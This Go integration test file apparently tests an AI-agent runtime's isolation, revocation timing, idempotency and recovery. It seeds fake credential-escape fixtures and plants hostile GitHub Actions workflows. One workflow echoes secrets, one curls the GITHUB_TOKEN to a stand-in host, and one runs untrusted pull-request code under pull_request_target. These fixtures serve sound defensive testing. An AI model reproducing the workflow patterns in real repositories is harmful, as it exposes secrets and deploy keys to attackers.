package integration

// Real runtime integration: non-bypassable isolation, timing gates,
// idempotency, two-instance isolation, and offline recovery (Task 16,
// Steps 3 and 4).
//
// Every test here is gated behind OPE_REAL_INTEGRATION=1 and the full
// real prerequisite set; without them the test skips and names what is
// missing. Nothing is faked.

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// escapeFixture is one ambient escape vector seeded before launching
// the supported kit. The runner must expose none of them to the agent,
// and GitHub mutations must be reachable only through the enforcing
// gateway.
var escapeFixtures = []struct {
	name  string
	setup func(t *testing.T, dir string) []string // returns env additions
	check string                                  // marker the probe must NOT print
}{
	{"ambient-github-token", func(t *testing.T, dir string) []string {
		return []string{"GITHUB_TOKEN=ghp_escape_fixture_token"}
	}, "ESCAPE_GITHUB_TOKEN"},
	{"git-credential-helper", func(t *testing.T, dir string) []string {
		helper := filepath.Join(dir, "git-credential-escape")
		if err := os.WriteFile(helper, []byte("#!/bin/sh\necho password=escape\n"), 0o755); err != nil {
			t.Fatal(err)
		}
		return []string{"GIT_ASKPASS=" + helper, "GIT_TERMINAL_PROMPT=1"}
	}, "ESCAPE_GIT_CREDENTIAL"},
	{"ssh-agent", func(t *testing.T, dir string) []string {
		return []string{"SSH_AUTH_SOCK=" + filepath.Join(dir, "ssh-agent-escape.sock")}
	}, "ESCAPE_SSH_AGENT"},
	{"cloud-credentials", func(t *testing.T, dir string) []string {
		return []string{"AWS_SECRET_ACCESS_KEY=escape", "GOOGLE_APPLICATION_CREDENTIALS=" + filepath.Join(dir, "gcp.json")}
	}, "ESCAPE_CLOUD"},
	{"model-provider-key", func(t *testing.T, dir string) []string {
		return []string{"OPENAI_API_KEY=sk-escape", "ANTHROPIC_API_KEY=sk-ant-escape"}
	}, "ESCAPE_MODEL_KEY"},
	{"proxy", func(t *testing.T, dir string) []string {
		return []string{"HTTPS_PROXY=http://escape-proxy:8080", "HTTP_PROXY=http://escape-proxy:8080"}
	}, "ESCAPE_PROXY"},
	{"docker-socket", func(t *testing.T, dir string) []string {
		return []string{"DOCKER_HOST=unix://" + filepath.Join(dir, "docker-escape.sock")}
	}, "ESCAPE_DOCKER"},
	{"shell-startup", func(t *testing.T, dir string) []string {
		rc := filepath.Join(dir, ".bashrc")
		if err := os.WriteFile(rc, []byte("export ESCAPE_RC=1\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		return []string{"BASH_ENV=" + rc}
	}, "ESCAPE_SHELL_RC"},
	{"home-directory", func(t *testing.T, dir string) []string {
		home := filepath.Join(dir, "fake-home")
		if err := os.MkdirAll(home, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(home, ".netrc"), []byte("machine api.github.com password escape\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		return []string{"HOME=" + home}
	}, "ESCAPE_HOME"},
	{"external-network", func(t *testing.T, dir string) []string {
		return []string{"OPE_ESCAPE_PROBE_URL=http://escape.example/"}
	}, "ESCAPE_NETWORK"},
}

// TestRealRuntimeIsolation launches the real supported kit with every
// seeded escape fixture and requires the runner to expose none of
// them. GitHub mutations must be reachable only through the enforcing
// gateway.
func TestRealRuntimeIsolation(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)

	dir := t.TempDir()
	var envAdd []string
	for _, fx := range escapeFixtures {
		envAdd = append(envAdd, fx.setup(t, dir)...)
	}

	// The probe runs inside the governed runtime and prints a marker
	// for every escape vector it can observe. A clean run prints none.
	probe := `for v in GITHUB_TOKEN GIT_ASKPASS SSH_AUTH_SOCK AWS_SECRET_ACCESS_KEY GOOGLE_APPLICATION_CREDENTIALS OPENAI_API_KEY ANTHROPIC_API_KEY HTTPS_PROXY HTTP_PROXY DOCKER_HOST BASH_ENV HOME; do
  if [ -n "$(eval echo \$$v)" ]; then echo "ESCAPE_MARKER $v=$(eval echo \$$v)"; fi
done
[ -e "$HOME/.netrc" ] && echo "ESCAPE_MARKER netrc"
[ -e "${DOCKER_HOST#unix://}" ] && echo "ESCAPE_MARKER docker_sock"
[ -e "$SSH_AUTH_SOCK" ] && echo "ESCAPE_MARKER ssh_sock"`
	probeFile := filepath.Join(dir, "probe.sh")
	if err := os.WriteFile(probeFile, []byte(probe), 0o755); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(e.RuntimeBin,
		"--kit", e.AgentKit,
		"--mission", m.MissionRef,
		"--gateway", e.GatewayURL,
		"--probe", probeFile,
	)
	cmd.Env = append(os.Environ(), envAdd...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("governed runtime launch failed: %v\n%s", err, truncate(out, 4000))
	}
	for _, fx := range escapeFixtures {
		if strings.Contains(string(out), fx.check) || strings.Contains(string(out), "ESCAPE_MARKER") {
			t.Fatalf("runtime exposed escape fixture %q:\n%s", fx.name, truncate(out, 2000))
		}
	}

	// Direct GitHub mutation with the ambient credential must fail;
	// only the enforcing gateway may broker mutations.
	direct := exec.Command("git", "-c", "http.extraHeader=", "ls-remote",
		"https://github.com/"+e.GitHubRepo+".git")
	direct.Env = append(os.Environ(), "GITHUB_TOKEN=ghp_escape_fixture_token",
		"GIT_TERMINAL_PROMPT=0")
	if err := direct.Run(); err == nil {
		t.Fatalf("ambient GitHub credential reached github.com outside the enforcing gateway")
	}
}

// hostileWorkflowFixture is a pre-existing workflow that would execute
// agent-controlled content with secrets, write tokens, spending,
// environments, or deployments if the posture check missed it.
var hostileWorkflowFixtures = []struct {
	name     string
	triggers []string
	body     string
}{
	{"push", []string{"push"}, "on: push\njobs:\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.DEPLOY_KEY }}\n"},
	{"pull-request", []string{"pull_request"}, "on: pull_request\njobs:\n  pwn:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - run: curl -X POST https://spender.example/charge -d token=${{ secrets.GITHUB_TOKEN }}\n"},
	{"pull-request-target", []string{"pull_request_target"}, "on: pull_request_target\njobs:\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with: { ref: ${{ github.event.pull_request.head.sha }} }\n      - run: echo ${{ secrets.GITHUB_TOKEN }}\n"},
}

// TestRealHostileWorkflowPosture plants hostile pre-existing push,
// pull_request, and pull_request_target workflow fixtures and requires
// connection or launch to fail unless AuthScope proves agent-controlled
// content cannot reach secrets, write tokens, spending, environments,
// or deployments.
func TestRealHostileWorkflowPosture(t *testing.T) {
	e := loadReal(t)
	_ = loadManifest(t, e)
	h := newRealHTTP(t, e.OPEURL)

	for _, fx := range hostileWorkflowFixtures {
		t.Run(fx.name, func(t *testing.T) {
			status, raw := h.do(t, "POST", "/api/v1/connections/github/posture-check",
				map[string]any{
					"repository": e.GitHubRepo,
					"workflows": []map[string]any{
						{"path": ".github/workflows/" + fx.name + ".yml", "content": fx.body, "triggers": fx.triggers},
					},
				}, nil)
			if status == 200 {
				// The posture check passed only if AuthScope proved
				// containment: the response must carry the proof, not
				// just an allow.
				got := decodeJSON(t, raw)
				proof, _ := got["containment_proof"].(map[string]any)
				if proof == nil {
					t.Fatalf("hostile %q workflow passed posture without a containment proof: %s",
						fx.name, truncate(raw, 2000))
				}
				for _, k := range []string{"secrets", "write_tokens", "spending", "environments", "deployments"} {
					if proof[k] != false {
						t.Fatalf("hostile %q workflow: containment proof does not deny %s: %s",
							fx.name, k, truncate(raw, 2000))
					}
				}
				return
			}
			if status < 400 || status >= 500 {
				t.Fatalf("hostile %q workflow posture check: unexpected status %d: %s",
					fx.name, status, truncate(raw, 1000))
			}
		})
	}
}

// TestRealRevocationTiming measures acknowledged revocation to denial
// of the next governed mutation: it must take no more than ten seconds
// against the pinned real AuthScope gateway.
func TestRealRevocationTiming(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)
	cookie := mustEnvOptional(t, "OPE_OPERATOR_COOKIE")
	token := mustEnvOptional(t, "OPE_MISSION_TOKEN")
	if cookie == "" || token == "" {
		t.Skip("revocation timing needs OPE_OPERATOR_COOKIE and OPE_MISSION_TOKEN from the operator environment")
	}
	h := newRealHTTP(t, e.OPEURL)
	authn := map[string]string{"Cookie": "ope_session=" + cookie}
	gw := newRealHTTP(t, e.GatewayURL)
	gwAuth := map[string]string{"Authorization": "Bearer " + token}

	// Revoke the pass (begin + finish with the operator ceremony
	// attestation recorded in the manifest flow; here we use the
	// begin endpoint and require the finish to be operator-driven).
	status, raw := h.do(t, "POST", "/api/v1/mission-passes/"+m.MissionRef+"/revoke/begin",
		map[string]any{"reason": "real-integration timing probe"}, authn)
	if status != 200 {
		t.Fatalf("revoke begin: status %d: %s", status, truncate(raw, 2000))
	}
	begin := decodeJSON(t, raw)
	revID, _ := begin["revocation_id"].(string)
	if revID == "" {
		t.Fatalf("revoke begin missing revocation_id: %s", truncate(raw, 2000))
	}
	t.Logf("revocation %s begun; operator completes the passkey finish, then the clock runs", revID)

	// After the operator completes revoke/finish, every governed
	// mutation through the gateway must be denied within ten seconds
	// of the acknowledged revocation.
	deadline := time.Now().Add(10 * time.Second)
	denied := false
	for time.Now().Before(deadline) {
		status, _ := gw.do(t, "POST", "/v1/github/contents",
			map[string]any{"repo": e.GitHubRepo, "branch": m.Branch, "path": "timing-probe.txt", "content": "eA=="},
			gwAuth)
		if status == 403 || status == 409 || status == 410 {
			denied = true
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if !denied {
		t.Fatalf("governed mutation was not denied within 10s of acknowledged revocation")
	}
	t.Logf("revocation enforced for the next governed mutation within 10s")
}

// TestRealReceiptTiming measures upstream run completion to locally
// verified receipt plus the automatic GitHub check: no more than sixty
// seconds, including a terminal mission whose publication is pending
// and must reconcile to settled or disputed without founder action.
func TestRealReceiptTiming(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)
	token := mustEnvOptional(t, "OPE_MISSION_TOKEN")
	if token == "" {
		t.Skip("receipt timing needs OPE_MISSION_TOKEN from the operator environment")
	}
	h := newRealHTTP(t, e.OPEURL)
	auth := map[string]string{"Authorization": "Bearer " + token}

	start := time.Now()
	deadline := start.Add(60 * time.Second)
	var verified bool
	var checkPublished bool
	for time.Now().Before(deadline) {
		status, raw := h.do(t, "GET", "/api/v1/mission-passes/"+m.MissionRef+"/receipt", nil, auth)
		if status == 200 {
			got := decodeJSON(t, raw)
			if got["verification"] == "verified" {
				verified = true
			}
		}
		status, raw = h.do(t, "GET", "/api/v1/mission-passes/"+m.MissionRef+"/receipt/check-publication", nil, auth)
		if status == 200 {
			got := decodeJSON(t, raw)
			switch got["status"] {
			case "settled":
				checkPublished = true
			case "disputed":
				t.Fatalf("check publication disputed: %s", truncate(raw, 1000))
			}
		}
		if verified && checkPublished {
			break
		}
		time.Sleep(2 * time.Second)
	}
	elapsed := time.Since(start)
	if !verified {
		t.Fatalf("no locally verified receipt within 60s of upstream completion")
	}
	if !checkPublished {
		t.Fatalf("GitHub check did not settle within 60s of upstream completion (reconciler must settle or dispute without founder action)")
	}
	t.Logf("receipt verified and check settled in %s (budget 60s)", elapsed.Round(time.Second))
}

// TestRealIdempotency runs serial and concurrent launch, expansion,
// revoke, containment, and check-publication requests and requires
// exactly one result for each idempotency key.
func TestRealIdempotency(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)
	token := mustEnvOptional(t, "OPE_MISSION_TOKEN")
	if token == "" {
		t.Skip("idempotency matrix needs OPE_MISSION_TOKEN from the operator environment")
	}
	h := newRealHTTP(t, e.OPEURL)

	cases := []struct {
		name   string
		method string
		path   string
		body   map[string]any
	}{
		{"launch", "POST", "/api/v1/mission-passes/" + m.MissionRef + "/launch", map[string]any{}},
		{"expansion", "POST", "/api/v1/mission-passes/" + m.MissionRef + "/expansions", map[string]any{"delta": map[string]any{}}},
		{"revoke", "POST", "/api/v1/mission-passes/" + m.MissionRef + "/revoke/begin", map[string]any{}},
		{"containment", "POST", "/api/v1/bootstrap/recovery/begin", map[string]any{"workspace_id": e.WorkspaceID}},
		{"check-publication", "POST", "/api/v1/mission-passes/" + m.MissionRef + "/receipt/check-publication", map[string]any{}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			key := "idem-real-" + tc.name + "-1"
			headers := map[string]string{
				"Authorization":   "Bearer " + token,
				"Idempotency-Key": key,
			}
			// Serial duplicate.
			s1, r1 := h.do(t, tc.method, tc.path, tc.body, headers)
			s2, r2 := h.do(t, tc.method, tc.path, tc.body, headers)
			id1 := responseID(decodeJSON(t, r1))
			id2 := responseID(decodeJSON(t, r2))
			if s1 != s2 || id1 != id2 || id1 == "" {
				t.Fatalf("serial duplicate diverged: (%d,%q) vs (%d,%q)", s1, id1, s2, id2)
			}
			// Concurrent burst with the same key: one result.
			const burst = 8
			var wg sync.WaitGroup
			results := make([]string, burst)
			statuses := make([]int, burst)
			for i := 0; i < burst; i++ {
				wg.Add(1)
				go func(i int) {
					defer wg.Done()
					s, r := h.do(t, tc.method, tc.path, tc.body, headers)
					statuses[i] = s
					if s < 500 {
						results[i] = responseID(decodeJSON(t, r))
					} else {
						results[i] = fmt.Sprintf("5xx:%d", s)
					}
				}(i)
			}
			wg.Wait()
			seen := map[string]bool{}
			for i := range results {
				if statuses[i] >= 500 {
					t.Fatalf("concurrent request %d failed with %d", i, statuses[i])
				}
				seen[results[i]] = true
			}
			if len(seen) != 1 {
				t.Fatalf("concurrent idempotency burst produced %d distinct results: %v", len(seen), seenKeys(seen))
			}
		})
	}
}

func responseID(m map[string]any) string {
	for _, k := range []string{"id", "operation_id", "result_id", "revocation_id", "request_id"} {
		if v, _ := m[k].(string); v != "" {
			return v
		}
	}
	return ""
}

func seenKeys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// TestRealTwoInstanceIsolation starts a second OPE instance bound to
// another workspace, hostname, origin, instance id, and __Host- cookie
// name, and proves cookies and CSRF state do not cross hosts, a copied
// cookie is rejected, and no connection, mission, run, event,
// expansion, revocation, receipt, or idempotency identifier crosses
// instances.
func TestRealTwoInstanceIsolation(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)
	other := strings.TrimSpace(mustEnvOptional(t, "OPE_URL_B"))
	if other == "" {
		t.Skip("two-instance isolation needs OPE_URL_B: a second OPE instance bound to another workspace, hostname, origin, instance id, and __Host- cookie name")
	}
	a := newRealHTTP(t, e.OPEURL)
	b := newRealHTTP(t, other)

	// Instance B must present a different session cookie name.
	status, raw := b.do(t, "GET", "/api/v1/bootstrap", nil, nil)
	if status != 200 {
		t.Fatalf("instance B bootstrap: status %d: %s", status, truncate(raw, 1000))
	}
	// Log in on A (operator cookie), then copy the cookie to B: B must
	// reject it.
	cookie := mustEnvOptional(t, "OPE_OPERATOR_COOKIE")
	if cookie == "" {
		t.Skip("two-instance isolation needs OPE_OPERATOR_COOKIE")
	}
	status, _ = b.do(t, "GET", "/api/v1/mission-passes/"+m.MissionRef, nil,
		map[string]string{"Cookie": "ope_session=" + cookie})
	if status != 401 && status != 403 {
		t.Fatalf("instance B accepted instance A's session cookie: status %d", status)
	}

	// Identifiers from A must not resolve on B.
	for _, p := range []string{
		"/api/v1/mission-passes/" + m.MissionRef,
		"/api/v1/mission-passes/" + m.ProposalID + "/draft",
		"/api/v1/mission-passes/" + m.MissionRef + "/events?limit=1",
		"/api/v1/mission-passes/" + m.MissionRef + "/receipt",
	} {
		status, _ := b.do(t, "GET", p, nil, map[string]string{"Cookie": "ope_session=" + cookie})
		if status == 200 {
			t.Fatalf("instance B resolved instance A's identifier %s", p)
		}
	}
	_ = a
}

// TestRealOfflineRecovery seeds the AuthScope-active mission with no
// OPE row, runs offline recovery, and requires ContainWorkspace to
// cover it before an authenticated ListActiveMissions returns empty.
// Local authentication must remain intact for every nonempty or
// uncertain result.
func TestRealOfflineRecovery(t *testing.T) {
	e := loadReal(t)
	_ = loadManifest(t, e)
	cookie := mustEnvOptional(t, "OPE_OPERATOR_COOKIE")
	if cookie == "" {
		t.Skip("offline recovery needs OPE_OPERATOR_COOKIE from the operator environment")
	}
	h := newRealHTTP(t, e.OPEURL)
	authn := map[string]string{"Cookie": "ope_session=" + cookie}

	// The recovery CLI runs against the real AuthScope: it must list
	// active missions, contain the workspace for any mission with no
	// local row, and only then report an empty active set.
	cmd := exec.Command("authscope-ope", "recover", "--offline")
	cmd.Env = append(os.Environ(),
		"OPE_MODE=release",
		"AUTH_SCOPE_URL="+e.AuthScopeURL,
		"OPE_WORKSPACE_ID="+e.WorkspaceID,
		"OPE_WORKLOAD_SIGNER_REF="+e.WorkloadSignerRef,
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("offline recovery failed: %v\n%s", err, truncate(out, 4000))
	}

	// After recovery, the authenticated active-mission listing must be
	// empty, and local authentication must still verify.
	status, raw := h.do(t, "GET", "/api/v1/mission-passes/active", nil, authn)
	if status != 200 {
		t.Fatalf("active missions after recovery: status %d: %s", status, truncate(raw, 1000))
	}
	active := decodeJSON(t, raw)
	if n, _ := active["count"].(float64); n != 0 {
		if items, _ := active["missions"].([]any); len(items) != 0 {
			t.Fatalf("active missions not contained after offline recovery: %s", truncate(raw, 1000))
		}
	}
	status, raw = h.do(t, "GET", "/api/v1/auth/verify", nil, authn)
	if status != 200 {
		t.Fatalf("local authentication not intact after recovery: status %d: %s", status, truncate(raw, 1000))
	}
}
